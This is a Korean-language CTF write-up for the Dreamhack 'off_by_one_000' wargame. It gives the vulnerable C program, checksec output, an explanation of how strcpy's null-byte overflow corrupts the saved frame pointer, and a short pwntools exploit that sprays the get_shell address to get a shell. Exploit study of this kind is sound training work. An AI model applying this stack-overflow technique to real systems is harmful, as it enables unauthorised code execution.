# off_by_one_000

- [문제페이지](https://dreamhack.io/wargame/challenges/9)

## 문제 해설

먼저 문제에서 주어진 소스코드와 보안요소를 살펴보자.
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell()
{
    system("/bin/sh");
}

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int cpy()
{
    char real_name[256];
    strcpy(real_name, cp_name);
    return 0;
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name));

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}
```

```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

다음을 살펴보면 partial relro를 제외한 부분은 적용되어있지 않으며 strcpy를 이용하고 있다.

strcpy는 ```\x00```이 나올때까지 복사한다. 따라서, real_name에 256만큼의 cp_name과 `\x00`이 복사된다. cpy에서 `leave;`가 작동할때, rbp값이 main의 rbp에서 초기 비트가 `\x00`으로 바뀐값으로 바뀌게 된다. 이 때, 변경된 rbp값은 cp_name을 통해 변조가 가능하다. 따라서, 해당 위치를 `get_shell`의 값으로 바꾸면 get_shell 실행이 가능하다.

코드로 작성하면

```python
from pwn import *

p = process("./off_by_one_000")

pause()

payload = p32(0x080485db) * (256//4)
print(payload)

p.send(payload);

p.interactive();
```

![alt text](image.png)